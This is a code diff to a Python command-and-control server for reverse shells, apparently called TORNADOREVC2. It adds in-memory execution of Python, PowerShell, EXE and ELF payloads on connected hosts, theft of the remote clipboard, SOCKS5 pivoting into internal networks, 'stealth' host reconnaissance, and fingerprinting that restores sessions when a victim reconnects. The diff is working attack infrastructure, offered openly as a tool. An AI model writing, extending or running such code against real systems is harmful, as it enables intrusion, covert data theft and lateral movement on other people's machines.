@@ -29,8 +29,11 @@ from .constants import (
     XFER_MARK_END,
     XFER_MARK_START,
 )
+from .clipboard import ClipboardManager
 from .payloads import get_payloads
+from .payload_exec import PayloadExecutor
 from .session_log import SessionLogger
+from .session_registry import SessionRegistry, compute_fingerprint
 from .sysinfo import (
     build_collect_commands,
     extract_sysinfo,
@@ -38,6 +41,7 @@ from .sysinfo import (
 )
 from .terminal import TerminalManager
 from .transfer import FileTransfer
+from .tunnel import TunnelManager
 
 
 class TORNADOREVC2:
@@ -53,6 +57,10 @@ class TORNADOREVC2:
         self.current_client = None
         self.client_lock = Lock()
         self.transfer = FileTransfer(self)
+        self.payload_exec = PayloadExecutor(self)
+        self.clipboard = ClipboardManager(self)
+        self.tunnels = TunnelManager(self)
+        self.registry = SessionRegistry()
         self.colors = {
             'cyan': '\033[96m', 'green': '\033[92m', 'yellow': '\033[93m',
             'red': '\033[91m', 'bold': '\033[1m', 'end': '\033[0m', 'blue': '\033[94m',
@@ -198,6 +206,8 @@ class TORNADOREVC2:
                 return self._complete_paths(text)
             if cmd == 'download' and arg_i == 2:
                 return self._complete_paths(text)
+            if cmd in ('runpy', 'runps', 'runexe', 'runelf') and arg_i == 1:
+                return self._complete_paths(text)
             return []
         if arg_i == 0:
             return sorted(c for c in MAIN_COMMANDS if c.startswith(text.lower()))
@@ -206,6 +216,8 @@ class TORNADOREVC2:
         if cmd == 'upload' and arg_i == 2:
             return self._complete_paths(text)
         if cmd == 'download' and arg_i == 3:
+            return self._complete_paths(text)
+        if cmd in ('runpy', 'runps', 'runexe', 'runelf') and arg_i == 2:
             return self._complete_paths(text)
         return []
 
@@ -341,16 +353,21 @@ class TORNADOREVC2:
             except Exception:
                 break
 
-    def _extract_marked(self, output):
+    def _extract_marked(self, output, start_mark=None, end_mark=None, strip_ws=True):
+        start_mark = start_mark or XFER_MARK_START
+        end_mark = end_mark or XFER_MARK_END
         output = self._strip_ansi(output)
-        start = output.rfind(XFER_MARK_START)
+        start = output.rfind(start_mark)
         if start == -1:
             return None
-        end = output.find(XFER_MARK_END, start + len(XFER_MARK_START))
+        end = output.find(end_mark, start + len(start_mark))
         if end == -1:
             return None
-        payload = output[start + len(XFER_MARK_START):end]
-        payload = re.sub(r'[\r\n\t ]', '', payload)
+        payload = output[start + len(start_mark):end]
+        if strip_ws:
+            payload = re.sub(r'[\r\n\t ]', '', payload)
+        else:
+            payload = payload.strip('\r\n\t ')
         return payload if payload else ''
 
     def _parse_marked_int(self, payload):
@@ -365,7 +382,12 @@ class TORNADOREVC2:
         match = re.search(r'[a-fA-F0-9]{64}', payload)
         return match.group().lower() if match else None
 
-    def _run_marked(self, client_sock, unix_cmd, win_ps_script, shell_type, timeout=15.0):
+    def _run_marked(
+        self, client_sock, unix_cmd, win_ps_script, shell_type, timeout=15.0,
+        start_mark=None, end_mark=None, strip_ws=True,
+    ):
+        start_mark = start_mark or XFER_MARK_START
+        end_mark = end_mark or XFER_MARK_END
         self._flush_shell(client_sock)
         if shell_type == 'windows':
             cmd = self._win_ps_cmd(win_ps_script)
@@ -373,8 +395,8 @@ class TORNADOREVC2:
             cmd = unix_cmd
         if not self.send_to_revshell(client_sock, cmd):
             return None
-        output = self.recv_output(client_sock, timeout=timeout, until_marker=XFER_MARK_END)
-        return self._extract_marked(output)
+        output = self.recv_output(client_sock, timeout=timeout, until_marker=end_mark)
+        return self._extract_marked(output, start_mark, end_mark, strip_ws)
 
     def _get_client_by_id(self, client_id):
         with self.client_lock:
@@ -544,16 +566,16 @@ class TORNADOREVC2:
     def verify_file(self, client_sock, remote_path):
         return self.transfer.verify_file(client_sock, remote_path)
 
-    def collect_sysinfo(self, client_sock, shell_type='unknown'):
+    def collect_sysinfo(self, client_sock, shell_type='unknown', mode='stealth'):
         self._flush_shell(client_sock)
-        unix_cmd, win_ps = build_collect_commands(shell_type)
+        unix_cmd, win_ps = build_collect_commands(shell_type, mode=mode)
         if shell_type == 'windows' and win_ps:
             cmd = self._win_ps_cmd(win_ps)
         elif unix_cmd:
             cmd = unix_cmd
         else:
             for st in ('unix', 'windows'):
-                u, w = build_collect_commands(st)
+                u, w = build_collect_commands(st, mode=mode)
                 if st == 'windows' and w:
                     cmd = self._win_ps_cmd(w)
                 else:
@@ -574,19 +596,44 @@ class TORNADOREVC2:
         output = self.recv_output(client_sock, timeout=12.0, until_marker=SYSINFO_MARK_END)
         return extract_sysinfo(output)
 
-    def show_sysinfo(self, client_sock, refresh=False):
+    def _parse_sysinfo_args(self, cmd_parts, from_client=False):
+        mode = 'stealth'
+        session_id = None
+        args = []
+        i = 1
+        while i < len(cmd_parts):
+            part = cmd_parts[i]
+            if part in ('--stealth', '--full'):
+                mode = part.lstrip('-')
+                i += 1
+                continue
+            args.append(part)
+            i += 1
+        if from_client:
+            return None, mode
+        session_id = args[0] if args else None
+        return session_id, mode
+
+    def show_sysinfo(self, client_sock, refresh=False, mode='stealth'):
         info = self._client_info(client_sock)
         if not info:
             print(f"{self.colors['red']}Client disconnected{self.colors['end']}")
             return
-        if refresh or not info.get('sysinfo'):
+        if refresh or not info.get('sysinfo') or info.get('sysinfo', {}).get('collection_mode') != mode:
             shell_type = info.get('type', 'unknown')
-            collected = self.collect_sysinfo(client_sock, shell_type)
+            collected = self.collect_sysinfo(client_sock, shell_type, mode=mode)
             if collected:
+                collected.setdefault('collection_mode', mode)
                 info['sysinfo'] = collected
                 logger = info.get('logger')
                 if logger:
                     logger.save_sysinfo(collected)
+                old_fp = info.get('fingerprint')
+                fp = compute_fingerprint(info)
+                if old_fp and old_fp != fp:
+                    self.registry.migrate_fingerprint(old_fp, fp, info)
+                info['fingerprint'] = fp
+                self.registry.register_active(info, fp)
         print(format_sysinfo(info.get('sysinfo'), self.colors))
 
     def print_status(self):
@@ -607,10 +654,13 @@ class TORNADOREVC2:
                     user = sysinfo.get('username', '?')
                     os_name = sysinfo.get('os', info.get('type', '?'))
                     arch = sysinfo.get('architecture', '')
+                    reconnects = info.get('connect_count', 1)
                     detail = f"{user}@{host} [{os_name}"
                     if arch:
                         detail += f"/{arch}"
                     detail += "]"
+                    if reconnects > 1:
+                        detail += f" (reconnects: {reconnects})"
                     log_dir = info.get('logger').session_dir if info.get('logger') else ''
                     print(f"  {display} {info['addr'][0]}:{info['addr'][1]} {proto} {detail} {status}")
                     if log_dir:
@@ -620,11 +670,45 @@ class TORNADOREVC2:
         osver = output.lower()
         if "windows" in osver or "microsoft" in osver or "c:\\" in osver:
             return "windows"
-        if "uid=" in osver or "linux" in osver or "darwin" in osver:
+        if "uid=" in osver or "linux" in osver or "bsd" in osver:
             return "unix"
         if "busybox" in osver or "/bin/sh" in osver:
             return "unix"
         return "unknown"
+
+    def _probe_identity(self, client_sock, shell_type):
+        """Collect hostname and username for stable session fingerprinting."""
+        if shell_type == 'windows':
+            cmd = self._win_ps_inline("Write-Output ($env:COMPUTERNAME + '|' + $env:USERNAME)")
+        elif shell_type == 'unix':
+            cmd = (
+                "printf '%s|%s' "
+                "\"$(hostname 2>/dev/null | head -1 | tr -d '\\r\\n')\" "
+                "\"$(id -un 2>/dev/null || whoami 2>/dev/null | tr -d '\\r\\n')\""
+            )
+        else:
+            return {}
+        self._flush_shell(client_sock, timeout=0.3)
+        if not self.send_to_revshell(client_sock, cmd):
+            return {}
+        output = self._strip_ansi(self.recv_output(client_sock, timeout=3.0))
+        line = ''
+        for candidate in reversed(output.splitlines()):
+            candidate = candidate.strip()
+            if '|' in candidate:
+                line = candidate
+                break
+        if not line or '|' not in line:
+            return {}
+        host, user = line.split('|', 1)
+        user = user.strip().split('\\')[-1]
+        identity = {
+            'hostname': host.strip(),
+            'username': user.strip(),
+        }
+        if identity['hostname'] or identity['username']:
+            return identity
+        return {}
 
     def get_host_info(self, client_sock):
         info = self._client_info(client_sock)
@@ -666,7 +750,7 @@ class TORNADOREVC2:
             print(f"{self.colors['blue']}Session log: {logger.session_dir}{self.colors['end']}")
         print(f"{self.colors['cyan']}{'='*70}{self.colors['end']}")
         print(f"{self.colors['yellow']}Ctrl+C sends interrupt; Ctrl+C twice exits to main menu{self.colors['end']}")
-        print(f"{self.colors['yellow']}Commands: sysinfo, upload/download [--resume], verify — type 'help'{self.colors['end']}\n")
+        print(f"{self.colors['yellow']}Commands: sysinfo, runpy/runps/runexe/runelf, clipboard, upload/download — type 'help'{self.colors['end']}\n")
         self._set_completer_mode('client')
         sys.stdout.flush()
 
@@ -698,8 +782,21 @@ class TORNADOREVC2:
                     cmd_lower = cmd_parts[0].lower()
 
                     if cmd_lower == 'sysinfo':
-                        self.show_sysinfo(client_sock, refresh=True)
+                        _, mode = self._parse_sysinfo_args(cmd_parts, from_client=True)
+                        self.show_sysinfo(client_sock, refresh=True, mode=mode)
                         continue
+
+                    if cmd_lower in ('runpy', 'runps', 'runexe', 'runelf'):
+                        if self.payload_exec.handle_command(client_sock, cmd_parts, from_client=True):
+                            continue
+
+                    if cmd_lower == 'clipboard':
+                        if self.clipboard.handle_command(client_sock, cmd_parts, from_client=True):
+                            continue
+
+                    if cmd_lower in ('socks', 'tunnels'):
+                        if self.tunnels.handle_command(client_sock, cmd_parts, from_client=True):
+                            continue
 
                     if cmd_lower == 'upload':
                         resume, args = self._parse_transfer_args(cmd_parts)
@@ -724,8 +821,22 @@ class TORNADOREVC2:
                     if cmd_lower == 'help':
                         print(f"""
     {self.colors['green']}SESSION:{self.colors['end']}
-    sysinfo                                Collect/display host information
-    exit(e) / quit(q) / CTRL+C             Return to the main menu
+    sysinfo [--stealth|--full]               Collect/display host information (default: stealth)
+    exit(e) / quit(q) / CTRL+C               Return to the main menu
+
+    {self.colors['green']}IN-MEMORY EXECUTION:{self.colors['end']}
+    runpy <local.py> [-- args] [--save-output <file>]
+    runps <local.ps1> [--save-output <file>]
+    runexe <local.exe> [-- args] [--save-output <file>]
+    runelf <local_binary> [-- args] [--save-output <file>]
+
+    {self.colors['green']}CLIPBOARD:{self.colors['end']}
+    clipboard                                 Read remote clipboard text
+
+    {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
+    socks <listen_port>                               SOCKS5 proxy via session
+    tunnels                                           List active SOCKS proxies
+    socks stop <proxy_id>                             Stop a SOCKS proxy
 
     {self.colors['green']}FILE TRANSFER:{self.colors['end']}
     upload [--resume] <local> <remote>     Chunked upload with SHA256 verify
@@ -770,6 +881,10 @@ class TORNADOREVC2:
                     self.print_payloads()
                 elif cmd_lower in ('status', 'ls'):
                     self.print_status()
+                elif cmd_lower == 'sessions':
+                    self.registry.list_sessions(self.colors)
+                elif cmd_lower == 'reconnects':
+                    self.registry.list_reconnects(self.colors)
                 elif cmd_lower == 'switch':
                     if len(cmd_parts) < 2:
                         print(f"{self.colors['red']}Usage: switch <ID>{self.colors['end']}")
@@ -819,6 +934,7 @@ class TORNADOREVC2:
                             for info in self.revshell_clients.values():
                                 if info['id'] == changed_id:
                                     info['name'] = new_name
+                                    self.registry.register_active(info, info.get('fingerprint'))
                                     print(f"{self.colors['green']}Client #{changed_id} renamed to '{new_name}'{self.colors['end']}")
                                     break
                             else:
@@ -826,17 +942,47 @@ class TORNADOREVC2:
                     except ValueError:
                         print(f"{self.colors['red']}Invalid ID or session name{self.colors['end']}")
                 elif cmd_lower == 'sysinfo':
-                    if len(cmd_parts) < 2:
-                        print(f"{self.colors['red']}Usage: sysinfo <ID>{self.colors['end']}")
+                    session_id, mode = self._parse_sysinfo_args(cmd_parts)
+                    if not session_id:
+                        print(f"{self.colors['red']}Usage: sysinfo <ID> [--stealth|--full]{self.colors['end']}")
+                        continue
+                    try:
+                        client_sock = self._get_client_by_id(int(session_id))
+                        if not client_sock:
+                            print(f"{self.colors['red']}Client #{session_id} not active{self.colors['end']}")
+                            continue
+                        self.show_sysinfo(client_sock, refresh=True, mode=mode)
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif cmd_lower in ('runpy', 'runps', 'runexe', 'runelf'):
+                    if len(cmd_parts) < 3:
+                        print(
+                            f"{self.colors['red']}Usage: {cmd_lower} <ID> <local_file> "
+                            f"[-- args] [--save-output <file>]{self.colors['end']}"
+                        )
                         continue
                     try:
                         client_sock = self._get_client_by_id(int(cmd_parts[1]))
                         if not client_sock:
                             print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
                             continue
-                        self.show_sysinfo(client_sock, refresh=True)
+                        self.payload_exec.handle_command(client_sock, cmd_parts)
                     except ValueError:
                         print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif cmd_lower == 'clipboard':
+                    if len(cmd_parts) < 2:
+                        print(f"{self.colors['red']}Usage: clipboard <ID>{self.colors['end']}")
+                        continue
+                    try:
+                        client_sock = self._get_client_by_id(int(cmd_parts[1]))
+                        if not client_sock:
+                            print(f"{self.colors['red']}Client #{cmd_parts[1]} not active{self.colors['end']}")
+                            continue
+                        self.clipboard.handle_command(client_sock, ['clipboard'])
+                    except ValueError:
+                        print(f"{self.colors['red']}Invalid ID{self.colors['end']}")
+                elif self.tunnels.handle_main_command(cmd_parts):
+                    pass
                 elif cmd_lower == 'upload':
                     resume, args = self._parse_transfer_args(cmd_parts)
                     if len(args) < 3:
@@ -881,12 +1027,28 @@ class TORNADOREVC2:
     switch <ID>             Client interaction
     kill <ID>               Terminate client
     status/ls               Show active clients
-    sysinfo <ID>            Refresh and show host information
+    sessions                Show tracked sessions (active + disconnected)
+    reconnects              Show session reconnect history
+    sysinfo <ID> [--stealth|--full]   Refresh and show host information (default: stealth)
     rename/rn <ID> <name>   Rename session
     payloads                Show payloads list
     clear/cls               Clear screen
     help                    This help menu
     exit/quit               Shutdown server
+
+    {self.colors['green']}INTERNAL PIVOTING (SOCKS5):{self.colors['end']}
+    socks <ID> <listen_port>                                 SOCKS5 proxy via session
+    tunnels                                                  List active SOCKS proxies
+    socks stop <proxy_id>                                    Stop a SOCKS proxy
+
+    {self.colors['green']}IN-MEMORY EXECUTION:{self.colors['end']}
+    runpy <ID> <local.py> [-- args] [--save-output <file>]
+    runps <ID> <local.ps1> [--save-output <file>]
+    runexe <ID> <local.exe> [-- args] [--save-output <file>]
+    runelf <ID> <local_binary> [-- args] [--save-output <file>]
+
+    {self.colors['green']}CLIPBOARD:{self.colors['end']}
+    clipboard <ID>                          Read remote clipboard text
 
     {self.colors['green']}FILE TRANSFER:{self.colors['end']}
     upload [--resume] <ID> <local> <remote>     Chunked upload with SHA256 verify
@@ -903,6 +1065,7 @@ class TORNADOREVC2:
             info = self.revshell_clients.pop(client_sock, None)
         if not info:
             return
+        self.tunnels.cleanup_session(client_sock)
         try:
             client_sock.close()
         except Exception:
@@ -911,22 +1074,25 @@ class TORNADOREVC2:
         logger = info.get('logger')
         if logger:
             logger.log_event('Session disconnected')
+        self.registry.mark_disconnected(info)
         print(f"{self.colors['red']}\n{display} {info['addr'][0]}:{info['addr'][1]} disconnected{self.colors['end']}")
+        print(f"{self.colors['yellow']}Session metadata preserved — will restore on reconnect (fingerprint: {info.get('fingerprint', '?')}){self.colors['end']}")
 
     def handle_client(self, client_sock, addr):
-        self.client_counter += 1
-        client_id = self.client_counter
         client_info = {
             'sock': client_sock,
             'addr': addr,
             'type': 'unknown',
-            'id': client_id,
+            'id': None,
             'name': None,
             'tls': isinstance(client_sock, ssl.SSLSocket),
             'pty': False,
             'init': False,
             'sysinfo': None,
             'logger': None,
+            'fingerprint': None,
+            'connect_count': 1,
+            'reconnected': False,
         }
         with self.client_lock:
             self.revshell_clients[client_sock] = client_info
@@ -935,9 +1101,10 @@ class TORNADOREVC2:
             client_sock,
             "uname -a 2>/dev/null || ver || cmd /c ver",
         )
-        output = self.recv_output(client_sock)
-        inferred = self.infer_platform(output)
+        probe_output = self.recv_output(client_sock)
+        inferred = self.infer_platform(probe_output)
         client_info['type'] = inferred
+        client_info['identity'] = self._probe_identity(client_sock, inferred)
 
         term = TerminalManager(
             send_fn=lambda cmd: self.send_to_revshell(client_sock, cmd),
@@ -952,16 +1119,66 @@ class TORNADOREVC2:
 
         self.recv_output(client_sock, timeout=2.0)
 
-        session_id = self._make_session_id(client_id, addr, inferred)
-        logger = SessionLogger(session_id)
-        client_info['logger'] = logger
-        logger.log_event(f"Session connected from {addr[0]}:{addr[1]} ({inferred})")
+        fingerprint = compute_fingerprint(client_info, probe_output)
+        prior = self.registry.find_reconnect(fingerprint, probe_output, client_info)
+        reconnected = False
+        previous_id = None
 
-        print(
-            f"{self.colors['green']}New Client #{client_id}: {addr[0]}:{addr[1]} "
-            f"({inferred.upper()}) | switch {client_id}{self.colors['end']}"
-        )
-        print(f"{self.colors['blue']}Logs: {logger.session_dir}{self.colors['end']}")
+        if prior and prior.get('status') == 'disconnected' and (
+            prior.get('log_session_id') or prior.get('log_dir')
+        ):
+            fingerprint = prior.get('fingerprint') or fingerprint
+            previous_id = prior.get('session_id')
+            client_id = prior.get('session_id', self.client_counter + 1)
+            client_info['id'] = client_id
+            client_info['name'] = prior.get('name')
+            client_info['sysinfo'] = prior.get('sysinfo')
+            if prior.get('identity') and not client_info.get('identity'):
+                client_info['identity'] = prior.get('identity')
+            client_info['fingerprint'] = fingerprint
+            client_info['reconnected'] = True
+            reconnected = True
+            logger = self.registry.restore_logger(prior.get('log_session_id'))
+            client_info['logger'] = logger
+            self.registry.log_reconnect(previous_id, client_id, fingerprint, addr)
+            client_info['connect_count'] = self.registry.get_connect_count(fingerprint)
+            if client_id > self.client_counter:
+                self.client_counter = client_id
+            if logger:
+                detail = f"from {addr[0]}:{addr[1]} (connect #{client_info['connect_count']})"
+                logger.log_reconnect(detail)
+        else:
+            self.client_counter += 1
+            client_id = self.client_counter
+            client_info['id'] = client_id
+            client_info['fingerprint'] = fingerprint
+            session_id = self._make_session_id(client_id, addr, inferred, client_info.get('sysinfo'))
+            logger = SessionLogger(session_id)
+            client_info['logger'] = logger
+            logger.log_event(f"Session connected from {addr[0]}:{addr[1]} ({inferred})")
+
+        self.registry.register_active(client_info, fingerprint, probe_output)
+
+        if reconnected:
+            display = client_info["name"] if client_info.get("name") else f"#{client_id}"
+            print(
+                f"{self.colors['green']}Client RECONNECTED {display}: {addr[0]}:{addr[1]} "
+                f"({inferred.upper()}) | restored session #{client_id} | switch {client_id}{self.colors['end']}"
+            )
+            if client_info.get('sysinfo'):
+                si = client_info['sysinfo']
+                print(
+                    f"{self.colors['cyan']}  Restored: {si.get('username', '?')}@{si.get('hostname', '?')} "
+                    f"[{si.get('os', '?')}] (connect #{client_info['connect_count']}){self.colors['end']}"
+                )
+        else:
+            print(
+                f"{self.colors['green']}New Client #{client_id}: {addr[0]}:{addr[1]} "
+                f"({inferred.upper()}) | switch {client_id}{self.colors['end']}"
+            )
+
+        if client_info.get('logger'):
+            print(f"{self.colors['blue']}Logs: {client_info['logger'].session_dir}{self.colors['end']}")
 
     def start(self):
         self.print_banner()
